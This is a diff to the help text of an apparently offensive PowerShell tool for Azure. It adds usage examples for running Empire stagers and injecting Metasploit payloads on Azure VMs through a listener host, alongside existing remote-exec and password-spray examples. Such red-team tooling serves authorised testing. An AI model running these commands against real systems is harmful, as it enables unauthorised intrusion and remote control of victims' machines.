@@ -76,6 +76,8 @@ function Show-Help {
         @{Name="intune-enum"; Auth="Required"; Description="Enumerate Intune/Endpoint Manager configuration (mimics nxc smb -M sccm-recon6)"}
         @{Name="delegation-enum"; Auth="Required"; Description="Enumerate OAuth2 delegation/impersonation paths (mimics nxc smb --delegate)"}
         @{Name="exec"; Auth="Required"; Description="Execute remote commands on Azure VMs (mimics nxc smb -x/-X)"}
+        @{Name="empire-exec"; Auth="Required"; Description="Execute Empire stager on Azure VMs (mimics nxc -M empire_exec)"}
+        @{Name="met-inject"; Auth="Required"; Description="Inject Metasploit payload on Azure VMs (mimics nxc -M met_inject)"}
         @{Name="help"; Auth="N/A"; Description="Display this help message"}
     )
     
@@ -120,6 +122,16 @@ function Show-Help {
     Write-Host "    .\azx.ps1 delegation-enum                - Enumerate OAuth2 delegation (--delegate)"
     Write-Host "    .\azx.ps1 exec -VMName vm-01 -x 'whoami' - Execute shell command (-x)"
     Write-Host "    .\azx.ps1 exec -VMName vm-01 -x '\$env:COMPUTERNAME' -PowerShell - Execute PowerShell (-X)"
+
+    Write-ColorOutput -Message "`n[*] Empire Execution Examples (NetExec -M empire_exec equivalent):" -Color "Yellow"
+    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -VMName vm-01"
+    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -AllVMs"
+    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -Obfuscate -AllVMs"
+
+    Write-ColorOutput -Message "`n[*] Metasploit Injection Examples (NetExec -M met_inject equivalent):" -Color "Yellow"
+    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -VMName vm-01"
+    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 443 -RAND xyz789 -SSL -AllVMs"
+    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ProxyHost proxy.corp -ProxyPort 8080 -VMName vm-01"
 
     Write-ColorOutput -Message "`n[*] Password Spray Examples (NetExec-style):" -Color "Yellow"
     Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'"
